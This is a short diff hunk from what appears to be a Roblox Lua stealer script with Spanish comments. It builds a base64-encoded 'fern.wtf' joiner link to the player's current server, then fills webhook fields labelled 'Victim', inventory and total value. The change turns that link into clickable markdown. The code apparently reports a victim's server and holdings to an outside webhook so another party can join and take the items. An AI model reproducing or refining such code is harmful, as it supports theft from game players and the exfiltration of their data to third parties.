@@ -181,10 +181,10 @@ local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId
 local encodedLink=base64Encode(rawLink)
 local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
 
--- Webhook fields
+-- Webhook fields con link clickeable
 local fields={
     {name="Victim 👤", value=LocalPlayer.Name, inline=true},
-    {name="Enlace seguro 🔗", value=safeLink, inline=false},
+    {name="Enlace seguro 🔗", value="[Click aquí]("..safeLink..")", inline=false},
     {name="Inventario 📦", value="", inline=false},
     {name="Valor total 📦", value=tostring(totalValue), inline=true}
 }
